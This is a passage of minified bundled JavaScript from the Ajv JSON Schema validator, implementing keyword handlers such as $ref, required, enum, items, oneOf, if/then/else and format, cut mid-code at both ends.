z1={keyword:E,definition:{...y,type:(0,U.getJSONTypes)(y.type),schemaType:(0,U.getJSONTypes)(y.schemaType)}};if(y.before)D1.call(this,H1,z1,y.before);else H1.rules.push(z1);g.all[E]=z1,(I=y.implements)===null||I===void 0||I.forEach((P1)=>this.addKeyword(P1))}function D1(E,y,a){let I=E.rules.findIndex((v)=>v.keyword===a);if(I>=0)E.rules.splice(I,0,y);else E.rules.push(y),this.logger.warn(`rule ${a} is not defined`)}function n(E){let{metaSchema:y}=E;if(y===void 0)return;if(E.$data&&this.opts.$data)y=u(y);E.validateSchema=this.compile(y,!0)}var t={$ref:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#"};function u(E){return{anyOf:[E,t]}}}),xu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q={keyword:"id",code(){throw Error('NOT SUPPORTED: keyword "id", use "$id" for schema ID')}};X.default=Q}),fu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.callRef=X.getValidate=void 0;var Q=wW(),J=x6(),Y=V0(),W=IX(),G=JK(),H=D0(),$={keyword:"$ref",schemaType:"string",code(K){let{gen:B,schema:q,it:Z}=K,{baseId:M,schemaEnv:L,validateName:R,opts:j,self:F}=Z,{root:A}=L;if((q==="#"||q==="#/")&&M===A.baseId)return w();let O=G.resolveRef.call(F,A,M,q);if(O===void 0)throw new Q.default(Z.opts.uriResolver,M,q);if(O instanceof G.SchemaEnv)return N(O);return C(O);function w(){if(L===A)return U(K,R,L,L.$async);let _=B.scopeValue("root",{ref:A});return U(K,Y._`${_}.validate`,A,A.$async)}function N(_){let h=z(K,_);U(K,h,_,_.$async)}function C(_){let h=B.scopeValue("schema",j.code.source===!0?{ref:_,code:(0,Y.stringify)(_)}:{ref:_}),o=B.name("valid"),p=K.subschema({schema:_,dataTypes:[],schemaPath:Y.nil,topSchemaRef:h,errSchemaPath:q},o);K.mergeEvaluated(p),K.ok(o)}}};function z(K,B){let{gen:q}=K;return B.validate?q.scopeValue("validate",{ref:B.validate}):Y._`${q.scopeValue("wrapper",{ref:B})}.validate`}X.getValidate=z;function U(K,B,q,Z){let{gen:M,it:L}=K,{allErrors:R,schemaEnv:j,opts:F}=L,A=F.passContext?W.default.this:Y.nil;if(Z)O();else w();function O(){if(!j.$async)throw Error("async schema referenced by sync schema");let _=M.let("valid");M.try(()=>{if(M.code(Y._`await ${(0,J.callValidateCode)(K,B,A)}`),C(B),!R)M.assign(_,!0)},(h)=>{if(M.if(Y._`!(${h} instanceof ${L.ValidationError})`,()=>M.throw(h)),N(h),!R)M.assign(_,!1)}),K.ok(_)}function w(){K.result((0,J.callValidateCode)(K,B,A),()=>C(B),()=>N(B))}function N(_){let h=Y._`${_}.errors`;M.assign(W.default.vErrors,Y._`${W.default.vErrors} === null ? ${h} : ${W.default.vErrors}.concat(${h})`),M.assign(W.default.errors,Y._`${W.default.vErrors}.length`)}function C(_){var h;if(!L.opts.unevaluated)return;let o=(h=q===null||q===void 0?void 0:q.validate)===null||h===void 0?void 0:h.evaluated;if(L.props!==!0)if(o&&!o.dynamicProps){if(o.props!==void 0)L.props=H.mergeEvaluated.props(M,o.props,L.props)}else{let p=M.var("props",Y._`${_}.evaluated.props`);L.props=H.mergeEvaluated.props(M,p,L.props,Y.Name)}if(L.items!==!0)if(o&&!o.dynamicItems){if(o.items!==void 0)L.items=H.mergeEvaluated.items(M,o.items,L.items)}else{let p=M.var("items",Y._`${_}.evaluated.items`);L.items=H.mergeEvaluated.items(M,p,L.items,Y.Name)}}}X.callRef=U,X.default=$}),hu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=xu1(),J=fu1(),Y=["$schema","$id","$defs","$vocabulary",{keyword:"$comment"},"definitions",Q.default,J.default];X.default=Y}),yu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=Q.operators,Y={maximum:{okStr:"<=",ok:J.LTE,fail:J.GT},minimum:{okStr:">=",ok:J.GTE,fail:J.LT},exclusiveMaximum:{okStr:"<",ok:J.LT,fail:J.GTE},exclusiveMinimum:{okStr:">",ok:J.GT,fail:J.LTE}},W={message:({keyword:H,schemaCode:$})=>Q.str`must be ${Y[H].okStr} ${$}`,params:({keyword:H,schemaCode:$})=>Q._`{comparison: ${Y[H].okStr}, limit: ${$}}`},G={keyword:Object.keys(Y),type:"number",schemaType:"number",$data:!0,error:W,code(H){let{keyword:$,data:z,schemaCode:U}=H;H.fail$data(Q._`${z} ${Y[$].fail} ${U} || isNaN(${z})`)}};X.default=G}),gu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J={message:({schemaCode:W})=>Q.str`must be multiple of ${W}`,params:({schemaCode:W})=>Q._`{multipleOf: ${W}}`},Y={keyword:"multipleOf",type:"number",schemaType:"number",$data:!0,error:J,code(W){let{gen:G,data:H,schemaCode:$,it:z}=W,U=z.opts.multipleOfPrecision,K=G.let("res"),B=U?Q._`Math.abs(Math.round(${K}) - ${K}) > 1e-${U}`:Q._`${K} !== parseInt(${K})`;W.fail$data(Q._`(${$} === 0 || (${K} = ${H}/${$}, ${B}))`)}};X.default=Y}),mu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});function Q(J){let Y=J.length,W=0,G=0,H;while(G<Y)if(W++,H=J.charCodeAt(G++),H>=55296&&H<=56319&&G<Y){if(H=J.charCodeAt(G),(H&64512)===56320)G++}return W}X.default=Q,Q.code='require("ajv/dist/runtime/ucs2length").default'}),uu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y=mu1(),W={message({keyword:H,schemaCode:$}){let z=H==="maxLength"?"more":"fewer";return Q.str`must NOT have ${z} than ${$} characters`},params:({schemaCode:H})=>Q._`{limit: ${H}}`},G={keyword:["maxLength","minLength"],type:"string",schemaType:"number",$data:!0,error:W,code(H){let{keyword:$,data:z,schemaCode:U,it:K}=H,B=$==="maxLength"?Q.operators.GT:Q.operators.LT,q=K.opts.unicode===!1?Q._`${z}.length`:Q._`${(0,J.useFunc)(H.gen,Y.default)}(${z})`;H.fail$data(Q._`${q} ${B} ${U}`)}};X.default=G}),cu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=x6(),J=V0(),Y={message:({schemaCode:G})=>J.str`must match pattern "${G}"`,params:({schemaCode:G})=>J._`{pattern: ${G}}`},W={keyword:"pattern",type:"string",schemaType:"string",$data:!0,error:Y,code(G){let{data:H,$data:$,schema:z,schemaCode:U,it:K}=G,B=K.opts.unicodeRegExp?"u":"",q=$?J._`(new RegExp(${U}, ${B}))`:(0,Q.usePattern)(G,z);G.fail$data(J._`!${q}.test(${H})`)}};X.default=W}),lu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J={message({keyword:W,schemaCode:G}){let H=W==="maxProperties"?"more":"fewer";return Q.str`must NOT have ${H} than ${G} properties`},params:({schemaCode:W})=>Q._`{limit: ${W}}`},Y={keyword:["maxProperties","minProperties"],type:"object",schemaType:"number",$data:!0,error:J,code(W){let{keyword:G,data:H,schemaCode:$}=W,z=G==="maxProperties"?Q.operators.GT:Q.operators.LT;W.fail$data(Q._`Object.keys(${H}).length ${z} ${$}`)}};X.default=Y}),pu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=x6(),J=V0(),Y=D0(),W={message:({params:{missingProperty:H}})=>J.str`must have required property '${H}'`,params:({params:{missingProperty:H}})=>J._`{missingProperty: ${H}}`},G={keyword:"required",type:"object",schemaType:"array",$data:!0,error:W,code(H){let{gen:$,schema:z,schemaCode:U,data:K,$data:B,it:q}=H,{opts:Z}=q;if(!B&&z.length===0)return;let M=z.length>=Z.loopRequired;if(q.allErrors)L();else R();if(Z.strictRequired){let A=H.parentSchema.properties,{definedProperties:O}=H.it;for(let w of z)if((A===null||A===void 0?void 0:A[w])===void 0&&!O.has(w)){let N=q.schemaEnv.baseId+q.errSchemaPath,C=`required property "${w}" is not defined at "${N}" (strictRequired)`;(0,Y.checkStrictMode)(q,C,q.opts.strictRequired)}}function L(){if(M||B)H.block$data(J.nil,j);else for(let A of z)(0,Q.checkReportMissingProp)(H,A)}function R(){let A=$.let("missing");if(M||B){let O=$.let("valid",!0);H.block$data(O,()=>F(A,O)),H.ok(O)}else $.if((0,Q.checkMissingProp)(H,z,A)),(0,Q.reportMissingProp)(H,A),$.else()}function j(){$.forOf("prop",U,(A)=>{H.setParams({missingProperty:A}),$.if((0,Q.noPropertyInData)($,K,A,Z.ownProperties),()=>H.error())})}function F(A,O){H.setParams({missingProperty:A}),$.forOf(A,U,()=>{$.assign(O,(0,Q.propertyInData)($,K,A,Z.ownProperties)),$.if((0,J.not)(O),()=>{H.error(),$.break()})},J.nil)}}};X.default=G}),du1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J={message({keyword:W,schemaCode:G}){let H=W==="maxItems"?"more":"fewer";return Q.str`must NOT have ${H} than ${G} items`},params:({schemaCode:W})=>Q._`{limit: ${W}}`},Y={keyword:["maxItems","minItems"],type:"array",schemaType:"number",$data:!0,error:J,code(W){let{keyword:G,data:H,schemaCode:$}=W,z=G==="maxItems"?Q.operators.GT:Q.operators.LT;W.fail$data(Q._`${H}.length ${z} ${$}`)}};X.default=Y}),YK=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=iN();Q.code='require("ajv/dist/runtime/equal").default',X.default=Q}),iu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=UW(),J=V0(),Y=D0(),W=YK(),G={message:({params:{i:$,j:z}})=>J.str`must NOT have duplicate items (items ## ${z} and ${$} are identical)`,params:({params:{i:$,j:z}})=>J._`{i: ${$}, j: ${z}}`},H={keyword:"uniqueItems",type:"array",schemaType:"boolean",$data:!0,error:G,code($){let{gen:z,data:U,$data:K,schema:B,parentSchema:q,schemaCode:Z,it:M}=$;if(!K&&!B)return;let L=z.let("valid"),R=q.items?(0,Q.getSchemaTypes)(q.items):[];$.block$data(L,j,J._`${Z} === false`),$.ok(L);function j(){let w=z.let("i",J._`${U}.length`),N=z.let("j");$.setParams({i:w,j:N}),z.assign(L,!0),z.if(J._`${w} > 1`,()=>(F()?A:O)(w,N))}function F(){return R.length>0&&!R.some((w)=>w==="object"||w==="array")}function A(w,N){let C=z.name("item"),_=(0,Q.checkDataTypes)(R,C,M.opts.strictNumbers,Q.DataType.Wrong),h=z.const("indices",J._`{}`);z.for(J._`;${w}--;`,()=>{if(z.let(C,J._`${U}[${w}]`),z.if(_,J._`continue`),R.length>1)z.if(J._`typeof ${C} == "string"`,J._`${C} += "_"`);z.if(J._`typeof ${h}[${C}] == "number"`,()=>{z.assign(N,J._`${h}[${C}]`),$.error(),z.assign(L,!1).break()}).code(J._`${h}[${C}] = ${w}`)})}function O(w,N){let C=(0,Y.useFunc)(z,W.default),_=z.name("outer");z.label(_).for(J._`;${w}--;`,()=>z.for(J._`${N} = ${w}; ${N}--;`,()=>z.if(J._`${C}(${U}[${w}], ${U}[${N}])`,()=>{$.error(),z.assign(L,!1).break(_)})))}}};X.default=H}),ru1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y=YK(),W={message:"must be equal to constant",params:({schemaCode:H})=>Q._`{allowedValue: ${H}}`},G={keyword:"const",$data:!0,error:W,code(H){let{gen:$,data:z,$data:U,schemaCode:K,schema:B}=H;if(U||B&&typeof B=="object")H.fail$data(Q._`!${(0,J.useFunc)($,Y.default)}(${z}, ${K})`);else H.fail(Q._`${B} !== ${z}`)}};X.default=G}),nu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y=YK(),W={message:"must be equal to one of the allowed values",params:({schemaCode:H})=>Q._`{allowedValues: ${H}}`},G={keyword:"enum",schemaType:"array",$data:!0,error:W,code(H){let{gen:$,data:z,$data:U,schema:K,schemaCode:B,it:q}=H;if(!U&&K.length===0)throw Error("enum must have non-empty array");let Z=K.length>=q.opts.loopEnum,M,L=()=>M!==null&&M!==void 0?M:M=(0,J.useFunc)($,Y.default),R;if(Z||U)R=$.let("valid"),H.block$data(R,j);else{if(!Array.isArray(K))throw Error("ajv implementation error");let A=$.const("vSchema",B);R=(0,Q.or)(...K.map((O,w)=>F(A,w)))}H.pass(R);function j(){$.assign(R,!1),$.forOf("v",B,(A)=>$.if(Q._`${L()}(${z}, ${A})`,()=>$.assign(R,!0).break()))}function F(A,O){let w=K[O];return typeof w==="object"&&w!==null?Q._`${L()}(${z}, ${A}[${O}])`:Q._`${z} === ${w}`}}};X.default=G}),au1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=yu1(),J=gu1(),Y=uu1(),W=cu1(),G=lu1(),H=pu1(),$=du1(),z=iu1(),U=ru1(),K=nu1(),B=[Q.default,J.default,Y.default,W.default,G.default,H.default,$.default,z.default,{keyword:"type",schemaType:["string","array"]},{keyword:"nullable",schemaType:"boolean"},U.default,K.default];X.default=B}),rN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.validateAdditionalItems=void 0;var Q=V0(),J=D0(),Y={message:({params:{len:H}})=>Q.str`must NOT have more than ${H} items`,params:({params:{len:H}})=>Q._`{limit: ${H}}`},W={keyword:"additionalItems",type:"array",schemaType:["boolean","object"],before:"uniqueItems",error:Y,code(H){let{parentSchema:$,it:z}=H,{items:U}=$;if(!Array.isArray(U)){(0,J.checkStrictMode)(z,'"additionalItems" is ignored when "items" is not an array of schemas');return}G(H,U)}};function G(H,$){let{gen:z,schema:U,data:K,keyword:B,it:q}=H;q.items=!0;let Z=z.const("len",Q._`${K}.length`);if(U===!1)H.setParams({len:$.length}),H.pass(Q._`${Z} <= ${$.length}`);else if(typeof U=="object"&&!(0,J.alwaysValidSchema)(q,U)){let L=z.var("valid",Q._`${Z} <= ${$.length}`);z.if((0,Q.not)(L),()=>M(L)),H.ok(L)}function M(L){z.forRange("i",$.length,Z,(R)=>{if(H.subschema({keyword:B,dataProp:R,dataPropType:J.Type.Num},L),!q.allErrors)z.if((0,Q.not)(L),()=>z.break())})}}X.validateAdditionalItems=G,X.default=W}),nN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.validateTuple=void 0;var Q=V0(),J=D0(),Y=x6(),W={keyword:"items",type:"array",schemaType:["object","array","boolean"],before:"uniqueItems",code(H){let{schema:$,it:z}=H;if(Array.isArray($))return G(H,"additionalItems",$);if(z.items=!0,(0,J.alwaysValidSchema)(z,$))return;H.ok((0,Y.validateArray)(H))}};function G(H,$,z=H.schema){let{gen:U,parentSchema:K,data:B,keyword:q,it:Z}=H;if(R(K),Z.opts.unevaluated&&z.length&&Z.items!==!0)Z.items=J.mergeEvaluated.items(U,z.length,Z.items);let M=U.name("valid"),L=U.const("len",Q._`${B}.length`);z.forEach((j,F)=>{if((0,J.alwaysValidSchema)(Z,j))return;U.if(Q._`${L} > ${F}`,()=>H.subschema({keyword:q,schemaProp:F,dataProp:F},M)),H.ok(M)});function R(j){let{opts:F,errSchemaPath:A}=Z,O=z.length,w=O===j.minItems&&(O===j.maxItems||j[$]===!1);if(F.strictTuples&&!w){let N=`"${q}" is ${O}-tuple, but minItems or maxItems/${$} are not specified or different at path "${A}"`;(0,J.checkStrictMode)(Z,N,F.strictTuples)}}}X.validateTuple=G,X.default=W}),ou1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=nN(),J={keyword:"prefixItems",type:"array",schemaType:["array"],before:"uniqueItems",code:(Y)=>(0,Q.validateTuple)(Y,"items")};X.default=J}),su1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y=x6(),W=rN(),G={message:({params:{len:$}})=>Q.str`must NOT have more than ${$} items`,params:({params:{len:$}})=>Q._`{limit: ${$}}`},H={keyword:"items",type:"array",schemaType:["object","boolean"],before:"uniqueItems",error:G,code($){let{schema:z,parentSchema:U,it:K}=$,{prefixItems:B}=U;if(K.items=!0,(0,J.alwaysValidSchema)(K,z))return;if(B)(0,W.validateAdditionalItems)($,B);else $.ok((0,Y.validateArray)($))}};X.default=H}),tu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y={message:({params:{min:G,max:H}})=>H===void 0?Q.str`must contain at least ${G} valid item(s)`:Q.str`must contain at least ${G} and no more than ${H} valid item(s)`,params:({params:{min:G,max:H}})=>H===void 0?Q._`{minContains: ${G}}`:Q._`{minContains: ${G}, maxContains: ${H}}`},W={keyword:"contains",type:"array",schemaType:["object","boolean"],before:"uniqueItems",trackErrors:!0,error:Y,code(G){let{gen:H,schema:$,parentSchema:z,data:U,it:K}=G,B,q,{minContains:Z,maxContains:M}=z;if(K.opts.next)B=Z===void 0?1:Z,q=M;else B=1;let L=H.const("len",Q._`${U}.length`);if(G.setParams({min:B,max:q}),q===void 0&&B===0){(0,J.checkStrictMode)(K,'"minContains" == 0 without "maxContains": "contains" keyword ignored');return}if(q!==void 0&&B>q){(0,J.checkStrictMode)(K,'"minContains" > "maxContains" is always invalid'),G.fail();return}if((0,J.alwaysValidSchema)(K,$)){let O=Q._`${L} >= ${B}`;if(q!==void 0)O=Q._`${O} && ${L} <= ${q}`;G.pass(O);return}K.items=!0;let R=H.name("valid");if(q===void 0&&B===1)F(R,()=>H.if(R,()=>H.break()));else if(B===0){if(H.let(R,!0),q!==void 0)H.if(Q._`${U}.length > 0`,j)}else H.let(R,!1),j();G.result(R,()=>G.reset());function j(){let O=H.name("_valid"),w=H.let("count",0);F(O,()=>H.if(O,()=>A(w)))}function F(O,w){H.forRange("i",0,L,(N)=>{G.subschema({keyword:"contains",dataProp:N,dataPropType:J.Type.Num,compositeRule:!0},O),w()})}function A(O){if(H.code(Q._`${O}++`),q===void 0)H.if(Q._`${O} >= ${B}`,()=>H.assign(R,!0).break());else if(H.if(Q._`${O} > ${q}`,()=>H.assign(R,!1).break()),B===1)H.assign(R,!0);else H.if(Q._`${O} >= ${B}`,()=>H.assign(R,!0))}}};X.default=W}),eu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.validateSchemaDeps=X.validatePropertyDeps=X.error=void 0;var Q=V0(),J=D0(),Y=x6();X.error={message:({params:{property:z,depsCount:U,deps:K}})=>{let B=U===1?"property":"properties";return Q.str`must have ${B} ${K} when property ${z} is present`},params:({params:{property:z,depsCount:U,deps:K,missingProperty:B}})=>Q._`{property: ${z},
    missingProperty: ${B},
    depsCount: ${U},
    deps: ${K}}`};var W={keyword:"dependencies",type:"object",schemaType:"object",error:X.error,code(z){let[U,K]=G(z);H(z,U),$(z,K)}};function G({schema:z}){let U={},K={};for(let B in z){if(B==="__proto__")continue;let q=Array.isArray(z[B])?U:K;q[B]=z[B]}return[U,K]}function H(z,U=z.schema){let{gen:K,data:B,it:q}=z;if(Object.keys(U).length===0)return;let Z=K.let("missing");for(let M in U){let L=U[M];if(L.length===0)continue;let R=(0,Y.propertyInData)(K,B,M,q.opts.ownProperties);if(z.setParams({property:M,depsCount:L.length,deps:L.join(", ")}),q.allErrors)K.if(R,()=>{for(let j of L)(0,Y.checkReportMissingProp)(z,j)});else K.if(Q._`${R} && (${(0,Y.checkMissingProp)(z,L,Z)})`),(0,Y.reportMissingProp)(z,Z),K.else()}}X.validatePropertyDeps=H;function $(z,U=z.schema){let{gen:K,data:B,keyword:q,it:Z}=z,M=K.name("valid");for(let L in U){if((0,J.alwaysValidSchema)(Z,U[L]))continue;K.if((0,Y.propertyInData)(K,B,L,Z.opts.ownProperties),()=>{let R=z.subschema({keyword:q,schemaProp:L},M);z.mergeValidEvaluated(R,M)},()=>K.var(M,!0)),z.ok(M)}}X.validateSchemaDeps=$,X.default=W}),Xc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y={message:"property name must be valid",params:({params:G})=>Q._`{propertyName: ${G.propertyName}}`},W={keyword:"propertyNames",type:"object",schemaType:["object","boolean"],error:Y,code(G){let{gen:H,schema:$,data:z,it:U}=G;if((0,J.alwaysValidSchema)(U,$))return;let K=H.name("valid");H.forIn("key",z,(B)=>{G.setParams({propertyName:B}),G.subschema({keyword:"propertyNames",data:B,dataTypes:["string"],propertyName:B,compositeRule:!0},K),H.if((0,Q.not)(K),()=>{if(G.error(!0),!U.allErrors)H.break()})}),G.ok(K)}};X.default=W}),aN=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=x6(),J=V0(),Y=IX(),W=D0(),G={message:"must NOT have additional properties",params:({params:$})=>J._`{additionalProperty: ${$.additionalProperty}}`},H={keyword:"additionalProperties",type:["object"],schemaType:["boolean","object"],allowUndefined:!0,trackErrors:!0,error:G,code($){let{gen:z,schema:U,parentSchema:K,data:B,errsCount:q,it:Z}=$;if(!q)throw Error("ajv implementation error");let{allErrors:M,opts:L}=Z;if(Z.props=!0,L.removeAdditional!=="all"&&(0,W.alwaysValidSchema)(Z,U))return;let R=(0,Q.allSchemaProperties)(K.properties),j=(0,Q.allSchemaProperties)(K.patternProperties);F(),$.ok(J._`${q} === ${Y.default.errors}`);function F(){z.forIn("key",B,(C)=>{if(!R.length&&!j.length)w(C);else z.if(A(C),()=>w(C))})}function A(C){let _;if(R.length>8){let h=(0,W.schemaRefOrVal)(Z,K.properties,"properties");_=(0,Q.isOwnProperty)(z,h,C)}else if(R.length)_=(0,J.or)(...R.map((h)=>J._`${C} === ${h}`));else _=J.nil;if(j.length)_=(0,J.or)(_,...j.map((h)=>J._`${(0,Q.usePattern)($,h)}.test(${C})`));return(0,J.not)(_)}function O(C){z.code(J._`delete ${B}[${C}]`)}function w(C){if(L.removeAdditional==="all"||L.removeAdditional&&U===!1){O(C);return}if(U===!1){if($.setParams({additionalProperty:C}),$.error(),!M)z.break();return}if(typeof U=="object"&&!(0,W.alwaysValidSchema)(Z,U)){let _=z.name("valid");if(L.removeAdditional==="failing")N(C,_,!1),z.if((0,J.not)(_),()=>{$.reset(),O(C)});else if(N(C,_),!M)z.if((0,J.not)(_),()=>z.break())}}function N(C,_,h){let o={keyword:"additionalProperties",dataProp:C,dataPropType:W.Type.Str};if(h===!1)Object.assign(o,{compositeRule:!0,createErrors:!1,allErrors:!1});$.subschema(o,_)}}};X.default=H}),Qc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=NW(),J=x6(),Y=D0(),W=aN(),G={keyword:"properties",type:"object",schemaType:"object",code(H){let{gen:$,schema:z,parentSchema:U,data:K,it:B}=H;if(B.opts.removeAdditional==="all"&&U.additionalProperties===void 0)W.default.code(new Q.KeywordCxt(B,W.default,"additionalProperties"));let q=(0,J.allSchemaProperties)(z);for(let j of q)B.definedProperties.add(j);if(B.opts.unevaluated&&q.length&&B.props!==!0)B.props=Y.mergeEvaluated.props($,(0,Y.toHash)(q),B.props);let Z=q.filter((j)=>!(0,Y.alwaysValidSchema)(B,z[j]));if(Z.length===0)return;let M=$.name("valid");for(let j of Z){if(L(j))R(j);else{if($.if((0,J.propertyInData)($,K,j,B.opts.ownProperties)),R(j),!B.allErrors)$.else().var(M,!0);$.endIf()}H.it.definedProperties.add(j),H.ok(M)}function L(j){return B.opts.useDefaults&&!B.compositeRule&&z[j].default!==void 0}function R(j){H.subschema({keyword:"properties",schemaProp:j,dataProp:j},M)}}};X.default=G}),Jc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=x6(),J=V0(),Y=D0(),W=D0(),G={keyword:"patternProperties",type:"object",schemaType:"object",code(H){let{gen:$,schema:z,data:U,parentSchema:K,it:B}=H,{opts:q}=B,Z=(0,Q.allSchemaProperties)(z),M=Z.filter((w)=>(0,Y.alwaysValidSchema)(B,z[w]));if(Z.length===0||M.length===Z.length&&(!B.opts.unevaluated||B.props===!0))return;let L=q.strictSchema&&!q.allowMatchingProperties&&K.properties,R=$.name("valid");if(B.props!==!0&&!(B.props instanceof J.Name))B.props=(0,W.evaluatedPropsToName)($,B.props);let{props:j}=B;F();function F(){for(let w of Z){if(L)A(w);if(B.allErrors)O(w);else $.var(R,!0),O(w),$.if(R)}}function A(w){for(let N in L)if(new RegExp(w).test(N))(0,Y.checkStrictMode)(B,`property ${N} matches pattern ${w} (use allowMatchingProperties)`)}function O(w){$.forIn("key",U,(N)=>{$.if(J._`${(0,Q.usePattern)(H,w)}.test(${N})`,()=>{let C=M.includes(w);if(!C)H.subschema({keyword:"patternProperties",schemaProp:w,dataProp:N,dataPropType:W.Type.Str},R);if(B.opts.unevaluated&&j!==!0)$.assign(J._`${j}[${N}]`,!0);else if(!C&&!B.allErrors)$.if((0,J.not)(R),()=>$.break())})})}}};X.default=G}),Yc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=D0(),J={keyword:"not",schemaType:["object","boolean"],trackErrors:!0,code(Y){let{gen:W,schema:G,it:H}=Y;if((0,Q.alwaysValidSchema)(H,G)){Y.fail();return}let $=W.name("valid");Y.subschema({keyword:"not",compositeRule:!0,createErrors:!1,allErrors:!1},$),Y.failResult($,()=>Y.reset(),()=>Y.error())},error:{message:"must NOT be valid"}};X.default=J}),Wc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=x6(),J={keyword:"anyOf",schemaType:"array",trackErrors:!0,code:Q.validateUnion,error:{message:"must match a schema in anyOf"}};X.default=J}),Gc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y={message:"must match exactly one schema in oneOf",params:({params:G})=>Q._`{passingSchemas: ${G.passing}}`},W={keyword:"oneOf",schemaType:"array",trackErrors:!0,error:Y,code(G){let{gen:H,schema:$,parentSchema:z,it:U}=G;if(!Array.isArray($))throw Error("ajv implementation error");if(U.opts.discriminator&&z.discriminator)return;let K=$,B=H.let("valid",!1),q=H.let("passing",null),Z=H.name("_valid");G.setParams({passing:q}),H.block(M),G.result(B,()=>G.reset(),()=>G.error(!0));function M(){K.forEach((L,R)=>{let j;if((0,J.alwaysValidSchema)(U,L))H.var(Z,!0);else j=G.subschema({keyword:"oneOf",schemaProp:R,compositeRule:!0},Z);if(R>0)H.if(Q._`${Z} && ${B}`).assign(B,!1).assign(q,Q._`[${q}, ${R}]`).else();H.if(Z,()=>{if(H.assign(B,!0),H.assign(q,R),j)G.mergeEvaluated(j,Q.Name)})})}}};X.default=W}),Hc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=D0(),J={keyword:"allOf",schemaType:"array",code(Y){let{gen:W,schema:G,it:H}=Y;if(!Array.isArray(G))throw Error("ajv implementation error");let $=W.name("valid");G.forEach((z,U)=>{if((0,Q.alwaysValidSchema)(H,z))return;let K=Y.subschema({keyword:"allOf",schemaProp:U},$);Y.ok($),Y.mergeEvaluated(K)})}};X.default=J}),$c1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J=D0(),Y={message:({params:H})=>Q.str`must match "${H.ifClause}" schema`,params:({params:H})=>Q._`{failingKeyword: ${H.ifClause}}`},W={keyword:"if",schemaType:["object","boolean"],trackErrors:!0,error:Y,code(H){let{gen:$,parentSchema:z,it:U}=H;if(z.then===void 0&&z.else===void 0)(0,J.checkStrictMode)(U,'"if" without "then" and "else" is ignored');let K=G(U,"then"),B=G(U,"else");if(!K&&!B)return;let q=$.let("valid",!0),Z=$.name("_valid");if(M(),H.reset(),K&&B){let R=$.let("ifClause");H.setParams({ifClause:R}),$.if(Z,L("then",R),L("else",R))}else if(K)$.if(Z,L("then"));else $.if((0,Q.not)(Z),L("else"));H.pass(q,()=>H.error(!0));function M(){let R=H.subschema({keyword:"if",compositeRule:!0,createErrors:!1,allErrors:!1},Z);H.mergeEvaluated(R)}function L(R,j){return()=>{let F=H.subschema({keyword:R},Z);if($.assign(q,Z),H.mergeValidEvaluated(F,q),j)$.assign(j,Q._`${R}`);else H.setParams({ifClause:R})}}}};function G(H,$){let z=H.schema[$];return z!==void 0&&!(0,J.alwaysValidSchema)(H,z)}X.default=W}),zc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=D0(),J={keyword:["then","else"],schemaType:["object","boolean"],code({keyword:Y,parentSchema:W,it:G}){if(W.if===void 0)(0,Q.checkStrictMode)(G,`"${Y}" without "if" is ignored`)}};X.default=J}),Uc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=rN(),J=ou1(),Y=nN(),W=su1(),G=tu1(),H=eu1(),$=Xc1(),z=aN(),U=Qc1(),K=Jc1(),B=Yc1(),q=Wc1(),Z=Gc1(),M=Hc1(),L=$c1(),R=zc1();function j(F=!1){let A=[B.default,q.default,Z.default,M.default,L.default,R.default,$.default,z.default,H.default,U.default,K.default];if(F)A.push(J.default,W.default);else A.push(Q.default,Y.default);return A.push(G.default),A}X.default=j}),Kc1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=V0(),J={message:({schemaCode:W})=>Q.str`must match format "${W}"`,params:({schemaCode:W})=>Q._`{format: ${W}}`},Y={keyword:"format",type:["number","string"],schemaType:"string",$data:!0,error:J,code(W,G){let{gen:H,data:$,$data:z,schema:U,schemaCode:K,it:B}=W,{opts:q,errSchemaPath:Z,schemaEnv:M,self:L}=B;if(!q.validateFormats)return;if(z)R();else j();function R(){let F=H.scopeValue("formats",{ref:L.formats,code:q.code.formats}),A=H.const("fDef",Q._`${F}[${K}]`),O=H.let("fType"),w=H.let("format");H.if(Q._`typeof ${A} == "object" && !(${A} instanceof RegExp)`,()=>H.assign(O,Q._`${A}.type || "string"`).assign(w,Q._`${A}.validate`),()=>H.assign(O,Q._`"string"`).assign(w,A)),W.fail$data((0,Q.or)(N(),C()));function 